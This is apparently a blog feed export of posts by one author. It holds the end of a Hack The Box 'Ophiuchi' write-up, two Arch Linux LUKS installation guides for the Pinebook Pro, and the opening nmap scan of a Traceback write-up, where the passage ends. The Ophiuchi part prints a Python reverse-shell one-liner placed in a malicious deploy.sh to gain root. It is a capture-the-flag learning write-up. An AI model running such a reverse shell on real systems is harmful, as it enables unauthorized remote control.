  (export &quot;__data_end&quot; (global 1))
  (export &quot;__heap_base&quot; (global 2)))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We finish up by rebuilding &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; via &lt;code class=&quot;highlighter-rouge&quot;&gt;~/Tools/wabt/bin/wat2wasm ~/main.wat &amp;gt; ~/main.wasm&lt;/code&gt;, and use &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt; once more to get it back on the machine.&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/recompile.png&quot; alt=&quot;recompile&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 11:&lt;/strong&gt; After modifying &lt;code class=&quot;highlighter-rouge&quot;&gt;i32.const&lt;/code&gt; to be equal &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, we place &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; back onto the victim machine.&lt;/p&gt;

&lt;p&gt;Next, we ssh back into the box as &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;. We’ll navigate to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and create our own &lt;code class=&quot;highlighter-rouge&quot;&gt;deploy.sh&lt;/code&gt; to call our reverse shell. Since we know port &lt;code class=&quot;highlighter-rouge&quot;&gt;8081&lt;/code&gt; worked last time, we’ll use that again (make sure the old listener used to catch the foothold is reset). The reverse shell payload will be the following python payload.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.3&quot;,8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/deploy_sh.png&quot; alt=&quot;deploy_sh&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 12:&lt;/strong&gt; SSH back in and create a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;deploy.sh&lt;/code&gt; to call a reverse shell.&lt;/p&gt;

&lt;p&gt;To gain root privileges we’ll do what we know we’re allowed to do which is &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /usr/bin/go run /opt/wasm-functions/index.go&lt;/code&gt;, and as you can see below netcat has caught the root reverse shell.&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/rooted.png&quot; alt=&quot;rooted&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 13:&lt;/strong&gt; Root achieved via &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory containing our own &lt;code class=&quot;highlighter-rouge&quot;&gt;deploy.sh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; files.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Knowing very little about Golang, and even less about WebAssembly, made the privilege escalation to root a real bastard for me. It was a great learning experience to decompile and recompile WebAssembly code. The box overall was extremely enjoyable (but I still am not sure how to pronounce the name).&lt;/p&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858&quot;&gt;https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;https://github.com/artsploit/yaml-payload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload/issues/3&quot;&gt;https://github.com/artsploit/yaml-payload/issues/3&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/WebAssembly/wabt&quot;&gt;https://github.com/WebAssembly/wabt&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="WebAssembly" /><category term="Golang" /><category term="java" /><category term="SnakeYAML" /><summary type="html"></summary></entry><entry><title type="html">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root…Again</title><link href="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again/" rel="alternate" type="text/html" title="Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root…Again" /><published>2021-06-28T00:00:00+00:00</published><updated>2021-06-28T18:28:30+00:00</updated><id>http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again</id><content type="html" xml:base="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again/">&lt;p&gt;In my &lt;a href=&quot;/luks-encrypted-arch-linux-on-pinebook-pro/&quot;&gt;previous post&lt;/a&gt; I went through the steps I used to install Arch Linux on my Pinebook Pro with a LUKS encrypted root partition. It appears that the repositories used in that post have been retired, and the packages hosted at &lt;em&gt;https://nhp.sh/pinebookpro/&lt;/em&gt; are no longer there. A big thanks to &lt;a href=&quot;https://github.com/nadiaholmquist&quot;&gt;Nadia Holmquist Pedersen&lt;/a&gt; for all the work she’s done for Arch on the Pinebook Pro.&lt;/p&gt;

&lt;p&gt;The following instructions use &lt;a href=&quot;https://kiljan.org/&quot;&gt;Sven Kiljan’s&lt;/a&gt; project. You can find his blog post discussing it &lt;a href=&quot;https://kiljan.org/2021/06/20/arch-linux-arm-on-a-pinebook-pro/&quot;&gt;here&lt;/a&gt;, and the GitHub repository &lt;a href=&quot;https://github.com/SvenKiljan/archlinuxarm-pbp/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;installation-on-microsd-card&quot;&gt;Installation on microSD card&lt;/h2&gt;
&lt;p&gt;These steps are largely for my personal reference, but they’re here for the public to read in the event that they may help someone do something similar. The majority of them are copied straight from &lt;a href=&quot;https://github.com/SvenKiljan/archlinuxarm-pbp/blob/main/INSTALL.md&quot;&gt;archlinuxarm-pbp’s INSTALL.md&lt;/a&gt;, with LUKS encryption stuff inserted here and there.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Boot from the ArchISO. In my previous post I flashed my eMMC with Naudia’s ArchISO. This is what I used to complete the steps below to reinstall Arch on my SD Card.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wifi-menu&lt;/code&gt; to get connected.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Zero the beginning of the SD card: &lt;code class=&quot;highlighter-rouge&quot;&gt;dd if=/dev/zero of=/dev/mmcblk1 bs=1M count=32&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Start fdisk to partition the SD card or eMMC module: &lt;code class=&quot;highlighter-rouge&quot;&gt;fdisk /dev/mmcblk1&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;At the fdisk prompt, create the new partition:
    &lt;ol&gt;
      &lt;li&gt;Type &lt;strong&gt;o&lt;/strong&gt;. This will clear out any partitions on the drive.&lt;/li&gt;
      &lt;li&gt;Type &lt;strong&gt;p&lt;/strong&gt; to list partitions. There should be no partitions left.&lt;/li&gt;
      &lt;li&gt;Type &lt;strong&gt;n&lt;/strong&gt;, then &lt;strong&gt;p&lt;/strong&gt; for primary, &lt;strong&gt;1&lt;/strong&gt; for the first partition on the drive, &lt;strong&gt;32768&lt;/strong&gt; for the first sector, and then type &lt;strong&gt;442367&lt;/strong&gt; for the last sector.&lt;/li&gt;
      &lt;li&gt;Type &lt;strong&gt;t&lt;/strong&gt;, then &lt;strong&gt;c&lt;/strong&gt; to set the first partition to type W95 FAT32 (LBA).&lt;/li&gt;
      &lt;li&gt;Type &lt;strong&gt;n&lt;/strong&gt;, then &lt;strong&gt;p&lt;/strong&gt; for primary, &lt;strong&gt;2&lt;/strong&gt; for the second partition on the drive, &lt;strong&gt;442368&lt;/strong&gt; for the first sector, and then press ENTER to accept the default last sector.&lt;/li&gt;
      &lt;li&gt;Write the partition table and exit by typing &lt;strong&gt;w&lt;/strong&gt;.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Create and mount the FAT filesystem: &lt;code class=&quot;highlighter-rouge&quot;&gt;mkfs.vfat -n BOOT_ALARM /dev/mmcblk1p1&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Encrypt the second partition with: &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup -y -v luksFormat /dev/mmcblk1p2&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Open the encrypted partition: &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup open /dev/mmcblk1p2 cryptroot&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Write the EXT4 file system to the partition we’ve just opened (our encrypted root) &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo mkfs.ext4 -L ROOT_ALARM /dev/mapper/cryptoroot&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;MOUNT UP!: &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo mount /dev/mapper/crytoroot /mnt &amp;amp;&amp;amp; sudo mount /dev/mmcblk1p1 /mnt/boot&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Download  the filesystem via &lt;code class=&quot;highlighter-rouge&quot;&gt;cd /mnt &amp;amp;&amp;amp; wget https://github.com/SvenKiljan/archlinuxarm-pbp/releases/latest/download/ArchLinuxARM-pbp-latest.tar.gz &lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Extract the root filesystem: &lt;code class=&quot;highlighter-rouge&quot;&gt;sdtar -xpf ArchLinuxARM-pbp-latest.tar.gz -C .&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Install the Tow-Boot bootloader:
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  dd if=boot/idbloader.img of=/dev/mmcblk1p1 seek=64 conv=notrunc,fsync
  dd if=boot/tow-boot.itb of=/dev/mmcblk1p1 seek=16384 conv=notrunc,fsync
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Enter chroot via &lt;code class=&quot;highlighter-rouge&quot;&gt;arch-chroot /mnt&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Edit &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/locale.gen&lt;/code&gt;, uncommenting what you need. For me this was &lt;code class=&quot;highlighter-rouge&quot;&gt;en_US.UTF-8 UTF-8&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Execute &lt;code class=&quot;highlighter-rouge&quot;&gt;locale-gen&lt;/code&gt; to generate the locales.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Modify &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/mkinitcpio.conf&lt;/code&gt; to include hooks, &lt;code class=&quot;highlighter-rouge&quot;&gt;HOOKS=(base udev autodetect keyboard keymap modconf block encrypt filesystems fsck)&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Issue &lt;code class=&quot;highlighter-rouge&quot;&gt;blkid&lt;/code&gt; to get the UUID of &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/mapper/cryptroot&lt;/code&gt; and modify &lt;code class=&quot;highlighter-rouge&quot;&gt;/boot/extlinux/extlinux.conf&lt;/code&gt; to look like such (replacing YOUR-UUID with your own):
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  LABEL Arch Linux ARM
  KERNEL /Image
  FDT /dtbs/rockchip/rk3399-pinebook-pro.dtb
  APPEND initrd=/initramfs-linux.img console=ttyS2,1500000 console=tty0 rootwait cryptdevice=UUID=YOUR-UUID:cryptroot root=/dev/mapper/cryptroot rw plymouth.ignore-serial-consoles
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Regenerate all the initramfs images with &lt;code class=&quot;highlighter-rouge&quot;&gt;mkinitcpio -P&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Now, leave chroot and reboot your machine to the new install on the SD card.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Log in as root (password is “root”) and connect to the wifi with &lt;code class=&quot;highlighter-rouge&quot;&gt;wifi-menu&lt;/code&gt; again.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Synchronize the system and RTC clocks:
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  timedatectl set-ntp on
  hwclock -w
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Initialize the pacman keyring and populate the Arch Linux ARM and Pinebook Pro &lt;a href=&quot;https://archlinuxarm.org/about/package-signing&quot;&gt;package signing&lt;/a&gt; keys:
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  pacman-key --init
  pacman-key --populate archlinuxarm
  pacman-key --populate archlinuxarm-pbp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Reboot, change password for &lt;em&gt;root&lt;/em&gt; user, remove &lt;em&gt;alarm&lt;/em&gt; user and add your own…continue to setup things how you’d like them to be (window manager, all other software, the fun stuff).&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/SvenKiljan/archlinuxarm-pbp/blob/main/INSTALL.md&quot;&gt;https://github.com/SvenKiljan/archlinuxarm-pbp/blob/main/INSTALL.md&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://wiki.archlinux.org/index.php/installation_guide&quot;&gt;https://wiki.archlinux.org/index.php/installation_guide&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://forum.pine64.org/showthread.php?tid=14238&quot;&gt;https://forum.pine64.org/showthread.php?tid=14238&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ryankozak.com/luks-encrypted-arch-linux-on-pinebook-pro/&quot;&gt;https://ryankozak.com/luks-encrypted-arch-linux-on-pinebook-pro/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rudism.com/pinebook-pro-arch-linux-alternative/&quot;&gt;https://rudism.com/pinebook-pro-arch-linux-alternative/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="Linux" /><category term="Pinebook Pro" /><category term="linux" /><category term="Arch Linux" /><category term="Pinebook Pro" /><summary type="html">In my previous post I went through the steps I used to install Arch Linux on my Pinebook Pro with a LUKS encrypted root partition. It appears that the repositories used in that post have been retired, and the packages hosted at https://nhp.sh/pinebookpro/ are no longer there. A big thanks to Nadia Holmquist Pedersen for all the work she’s done for Arch on the Pinebook Pro.</summary></entry><entry><title type="html">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root</title><link href="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro/" rel="alternate" type="text/html" title="Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root" /><published>2020-12-15T00:00:00+00:00</published><updated>2021-06-28T18:28:30+00:00</updated><id>http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro</id><content type="html" xml:base="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/12/pinebook_arch.png&quot; alt=&quot;Pinebook Pro Running Arch&quot; /&gt;&lt;/p&gt;

&lt;p&gt;My Pinebook Pro came in last week and yesterday I finally got a chance to really play with it. The first thing I wanted to do was get Arch installed on it with an encrypted root partition. I need these notes as a reference to use the next time I do this, so I figured I’d post them up to help anyone else out that may be trying to achieve the same thing. This post ignores post installation configuration. It just gets you booting into the terminal of your LUKS encrypted partition. From there it’s up to you to setup users, install your desktop manager, etc.&lt;/p&gt;

&lt;h3 id=&quot;preperation&quot;&gt;Preperation&lt;/h3&gt;
&lt;p&gt;This may not be anyone else’s preference, but I chose to flash the eMMC with the archiso, and install Arch onto the SD card. I don’t have much use for the internal eMMC to be honest. I was more excited that the Pinebook can run an OS off the microSD. For now I figure I’ll just keep the archiso on the eMMC to use for recovery when I need it. I’m going to skip the steps required to flash the ISO to the eMMC and the SD card. If you’re to the point of installing and using Arch you won’t need these steps, and you’ll likely not want to do exactly what I did anyway.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: At the time of posting this Pre-built image 2020-07-02 just wouldn’t boot for me, so I used &lt;a href=&quot;https://github.com/nadiaholmquist/archiso-pbp/releases/tag/20200616&quot;&gt;Pre-built image 2020-06-16&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;installation&quot;&gt;Installation&lt;/h3&gt;
&lt;p&gt;Remember &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/mmcblk1&lt;/code&gt; is the SD card, and &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/mmcblk2&lt;/code&gt; is eMMC, so adjust the steps accordingly to install this where you’re intending to.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Boot from ArchISO.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wifi-menu&lt;/code&gt; and select wireless network.&lt;/li&gt;
  &lt;li&gt;Set your clock so pacman doesn’t get ssl errors, &lt;code class=&quot;highlighter-rouge&quot;&gt;timedatectl set-ntp true&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Partition boot on SD card &lt;code class=&quot;highlighter-rouge&quot;&gt;fdisk /dev/mmcblk1&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;First sector &lt;code class=&quot;highlighter-rouge&quot;&gt;65536&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;+128M&lt;/li&gt;
      &lt;li&gt;Check partitions with &lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt; and note last sector of first partition.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;First sector is right after the last sector of the first.&lt;/li&gt;
      &lt;li&gt;Size for the rest of the drive.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;w&lt;/code&gt; write the changes&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Write an EXT4 file system to the boot partition &lt;code class=&quot;highlighter-rouge&quot;&gt;mkfs.ext4 /dev/mmcblk1p1&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Encrypt the second partition with LUKS &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup -y -v luksFormat /dev/mmcblk1p2&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Open the encrypted partition &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup open /dev/mmcblk1p2 cryptroot&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Write the EXT4 file system to the partition we’ve just opened (our encrypted root) &lt;code class=&quot;highlighter-rouge&quot;&gt;mkfs.ext4 /dev/mapper/cryptroot&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Mount the new partition&lt;/li&gt;
  &lt;li&gt;First make the &lt;em&gt;mnt&lt;/em&gt; directory with &lt;code class=&quot;highlighter-rouge&quot;&gt;mkdir /mnt&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Now mount the encrypted root partition there, &lt;code class=&quot;highlighter-rouge&quot;&gt;mount /dev/mapper/cryptroot /mnt&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Create a &lt;code class=&quot;highlighter-rouge&quot;&gt;/mnt/boot&lt;/code&gt; directory and mount the first partition (boot partition) to the new boot directory.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mkdir /mnt/boot&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mount /dev/mmcblk1p1 /mnt/boot&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Install everything with pacstrap via &lt;code class=&quot;highlighter-rouge&quot;&gt;pacstrap /mnt base base-devel linux-pbp pbp-keyboard-hwdb ap6256-firmware vim&lt;/code&gt; add whatever else you know you want here.&lt;/li&gt;
  &lt;li&gt;Use &lt;code class=&quot;highlighter-rouge&quot;&gt;genfstab -U /mnt&lt;/code&gt; to create a new fstab at &lt;code class=&quot;highlighter-rouge&quot;&gt;/mnt/etc/fstab&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;arch-chroot /mnt&lt;/code&gt; to get into your installation.&lt;/li&gt;
  &lt;li&gt;Edit &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/locale.gen&lt;/code&gt;, uncommenting what you need. For me this was &lt;code class=&quot;highlighter-rouge&quot;&gt;en_US.UTF-8 UTF-8&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Execute &lt;code class=&quot;highlighter-rouge&quot;&gt;locale-gen&lt;/code&gt; to generate the locales.&lt;/li&gt;
  &lt;li&gt;Create &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/locale.conf&lt;/code&gt; and add &lt;code class=&quot;highlighter-rouge&quot;&gt;LANG=en_US.UTF-8&lt;/code&gt; (or whatever other languages you need).&lt;/li&gt;
  &lt;li&gt;Modify &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/mkinitcpio.conf&lt;/code&gt; to include modules, &lt;code class=&quot;highlighter-rouge&quot;&gt;MODULES=(panfrost rockchipdrm drm_kms_helper hantro_vpu analogix_dp rockchip_rga panel_simple arc_uart cw2015_battery i2c-hid iscsi_boot_sysfs jsm pwm_bl uhid)&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Modify &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/mkinitcpio.conf&lt;/code&gt; to include hooks, &lt;code class=&quot;highlighter-rouge&quot;&gt;HOOKS=(base udev autodetect keyboard keymap modconf block encrypt filesystems fsck)&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Make the &lt;code class=&quot;highlighter-rouge&quot;&gt;extlinux&lt;/code&gt; directory &lt;code class=&quot;highlighter-rouge&quot;&gt;mkdir /boot/extlinux&lt;/code&gt; and create the file below &lt;code class=&quot;highlighter-rouge&quot;&gt;vim /boot/extlinux/extlinux.conf&lt;/code&gt; (use blkid to find your UUID).
Tip for UUID, I did a &lt;code class=&quot;highlighter-rouge&quot;&gt;blk &amp;gt;&amp;gt; /boot/extlinux/extlinux.conf&lt;/code&gt; to write the UUID’s into the file so I could actually see them as I was in VIM, then just deleted the lines before saving.
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LABEL Arch Linux ARM
KERNEL /Image
FDT /dtbs/rockchip/rk3399-pinebook-pro.dtb
APPEND initrd=/initramfs-linux.img console=tty1 rootwait cryptdevice=UUID=YOUR-UUID:cryptroot root=/dev/mapper/cryptroot rw
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Enable the network manager &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl enable NetworkManager&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Set root password with &lt;code class=&quot;highlighter-rouge&quot;&gt;passwd&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Reboot, and continue to setup things how you’d like.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://wiki.archlinux.org/index.php/installation_guide&quot;&gt;https://wiki.archlinux.org/index.php/installation_guide&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/nadiaholmquist/archiso-pbp&quot;&gt;https://github.com/nadiaholmquist/archiso-pbp&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rudism.com/installing-arch-linux-on-the-pinebook-pro&quot;&gt; https://rudism.com/installing-arch-linux-on-the-pinebook-pro/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.bencode.net/posts/pinebook/&quot;&gt;https://www.bencode.net/posts/pinebook/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="Linux" /><category term="Pinebook Pro" /><category term="linux" /><category term="Arch Linux" /><category term="Pinebook Pro" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Traceback</title><link href="http://0.0.0.0:4000/hack-the-box-craft-traceback/" rel="alternate" type="text/html" title="Hack The Box - Traceback" /><published>2020-08-17T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-traceback</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-traceback/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Traceback is an easy level box. It’s one of the first boxes on which I’ve been able to get user and root in one sitting. There’s a little bit of OSINT and guess work involved in the initial foothold, and the user/root portions aren’t too difficult at all. The theme of the box is that it has already been compromised by another hacker (Xh4H who authoried the box), and you seem to be retracing their steps while gaining user and root flags.&lt;/p&gt;

&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
&lt;h2 id=&quot;port-scan-nmap&quot;&gt;Port Scan: Nmap&lt;/h2&gt;
&lt;p&gt;We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sVC&lt;/span&gt; 10.10.10.181
&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 18:54 EDT
Nmap scan report for 10.10.10.181
Host is up (0.084s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
